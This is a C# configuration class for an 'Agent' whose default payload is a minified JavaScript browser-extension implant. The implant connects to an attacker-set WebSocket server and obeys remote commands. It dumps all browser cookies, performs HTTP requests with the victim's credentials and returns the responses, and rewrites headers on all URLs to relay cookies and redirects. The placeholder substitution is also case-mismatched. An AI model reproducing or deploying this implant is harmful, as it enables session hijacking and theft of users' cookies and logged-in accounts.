﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent
{
    public class Config
    {
        public string payload { get; set; }
        public string debug_port { get; set; } = "2222";
        //ws://127.0.0.1:4343
        public string target { get; set; } = string.Empty;
        public string cmdline { get; set; } = string.Empty;
        public int parent { get; set; } = 0;
        public string path { get; set; } = string.Empty;

        public string GetDefaultPayload()
        {

            return "var websocket=!1,last_live_connection_timestamp=get_unix_timestamp(),placeholder_secret_token=get_secure_random_token(64),redirect_table={};const REQUEST_HEADER_BLACKLIST=[\"cookie\"],RPC_CALL_TABLE={HTTP_REQUEST:perform_http_request,PONG(){},AUTH:authenticate,GET_COOKIES:get_cookies};async function get_cookies(e){return chrome.cookies?getallcookies({}):[]}function getallcookies(e){return new Promise(function(t,r){try{chrome.cookies.getAll(e,function(e){t(e)})}catch(a){r(a)}})}async function authenticate(e){var t=localStorage.getItem(\"browser_id\");return null===t&&(t=uuidv4(),localStorage.setItem(\"browser_id\",t)),{browser_id:t,user_agent:navigator.userAgent,timestamp:get_unix_timestamp()}}function get_secure_random_token(e){let t=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\",r=new Uint8Array(e);window.crypto.getRandomValues(r),r=r.map(e=>t.charCodeAt(e%t.length));let a=String.fromCharCode.apply(null,r);return a}function uuidv4(){return\"10000000-1000-4000-8000-100000000000\".replace(/[018]/g,e=>(e^crypto.getRandomValues(new Uint8Array(1))[0]&15>>e/4).toString(16))}function arrayBufferToBase64(e){for(var t=\"\",r=new Uint8Array(e),a=r.byteLength,o=0;o<a;o++)t+=String.fromCharCode(r[o]);return window.btoa(t)}function get_unix_timestamp(){return Math.floor(Date.now()/1e3)}const websocket_check_interval=setInterval(()=>{let e=[0,2];if(e.includes(websocket.readyState)){console.log(\"WebSocket not in appropriate state for liveness check...\");return}let t=get_unix_timestamp(),r=t-last_live_connection_timestamp;if(r>29||3===websocket.readyState){console.error(\"WebSocket does not appear to be live! Restarting the WebSocket connection...\");try{websocket.close()}catch(a){}initialize();return}websocket.send(JSON.stringify({id:uuidv4(),version:\"1.0.0\",action:\"PING\",data:{}}))},3e3),HEADERS_TO_REPLACE=[\"origin\",\"referer\",\"access-control-request-headers\",\"access-control-request-method\",\"access-control-allow-origin\",\"date\",\"dnt\",\"trailer\",\"upgrade\"];async function perform_http_request(e){let t=e.authenticated?\"include\":\"omit\";e.headers[\"X-PLACEHOLDER-SECRET\"]=placeholder_secret_token;var r=[];let a=Object.keys(e.headers);a.map(e=>{HEADERS_TO_REPLACE.includes(e.toLowerCase())&&r.push(e)}),r.map(t=>{let r=`X-PLACEHOLDER-${t}`;e.headers[r]=e.headers[t],delete e.headers[t]});var o={method:e.method,mode:\"cors\",cache:\"no-cache\",credentials:t,headers:e.headers,redirect:\"follow\"};if(e.body){let s=`data:application/octet-stream;base64,${e.body}`,n=await fetch(s);o.body=await n.blob()}try{var i=await fetch(e.url,o)}catch(c){console.error(\"Error occurred while performing fetch:\"),console.error(c);return}var u={};for(var l of i.headers.entries())\"x-set-cookie\"===l[0]?u[\"Set-Cookie\"]=JSON.parse(l[1]):u[l[0]]=l[1];let d=`${location.origin.toString()}/redirect-hack.html?id=`;if(i.url.startsWith(d)){var m=decodeURIComponent(i.url);m=m.replace(d,\"\");let p=m,h=redirect_table[p];delete redirect_table[p];var E={};h.headers.map(e=>{\"set-cookie\"!==e.name.toLowerCase()&&(\"X-Set-Cookie\"===e.name?E[\"Set-Cookie\"]=JSON.parse(e.value):E[e.name]=e.value)});let f={url:i.url,status:h.status_code,status_text:\"Redirect\",headers:E,body:\"\"};return f}return{url:i.url,status:i.status,status_text:i.statusText,headers:u,body:arrayBufferToBase64(await i.arrayBuffer())}}function initialize(){(websocket=new WebSocket(\"{{TARGET}}\")).onopen=function(e){},websocket.onmessage=async function(e){last_live_connection_timestamp=get_unix_timestamp();try{var t=JSON.parse(e.data)}catch(r){console.error(\"Could not parse WebSocket message!\"),console.error(r);return}if(t.action in RPC_CALL_TABLE){let a=await RPC_CALL_TABLE[t.action](t.data);websocket.send(JSON.stringify({id:t.id,origin_action:t.action,result:a}))}else console.error(`No RPC action ${t.action}!`)},websocket.onclose=function(e){e.wasClean?console.log(`[close] Connection closed cleanly, code=${e.code} reason=${e.reason}`):console.log(\"[close] Connection died\")},websocket.onerror=function(e){console.log(`[error] ${e.message}`)}}initialize(),chrome.webRequest.onBeforeSendHeaders.addListener(function(e){if(e.initiator===location.origin.toString()){var t=!1,r=[],a=[];return(e.requestHeaders.map(e=>{\"X-PLACEHOLDER-SECRET\"===e.name&&e.value===placeholder_secret_token&&(t=!0,r.push(\"X-PLACEHOLDER-SECRET\"))}),t)?(e.requestHeaders.map(e=>{!e.name.startsWith(\"X-PLACEHOLDER-SECRET\")&&e.name.startsWith(\"X-PLACEHOLDER-\")&&(r.push(e.name),!REQUEST_HEADER_BLACKLIST.includes(e.name.replace(\"X-PLACEHOLDER-\",\"\").toLowerCase())&&a.push({name:e.name.replace(\"X-PLACEHOLDER-\",\"\"),value:e.value}))}),e.requestHeaders=e.requestHeaders.filter(e=>!r.includes(e.name)),e.requestHeaders=e.requestHeaders.concat(a),{requestHeaders:e.requestHeaders}):{cancel:!1}}},{urls:[\"<all_urls>\"]},[\"blocking\",\"requestHeaders\",\"extraHeaders\"]);const REDIRECT_STATUS_CODES=[301,302,307];chrome.webRequest.onHeadersReceived.addListener(function(e){if(e.initiator!==location.origin.toString())return;var t=[];if(e.responseHeaders.map(e=>{\"set-cookie\"===e.name.toLowerCase()&&t.push(e.value)}),0!=t.length&&e.responseHeaders.push({name:\"X-Set-Cookie\",value:JSON.stringify(t)}),!REDIRECT_STATUS_CODES.includes(e.statusCode))return{responseHeaders:e.responseHeaders};let r=uuidv4();return redirect_table[r]=JSON.parse(JSON.stringify({url:e.url,status_code:e.statusCode,headers:e.responseHeaders})),{redirectUrl:`${location.origin.toString()}/redirect-hack.html?id=`+r}},{urls:[\"<all_urls>\"]},[\"blocking\",\"responseHeaders\",\"extraHeaders\"]);".Replace("{{target}}", target);
        }
    }
}
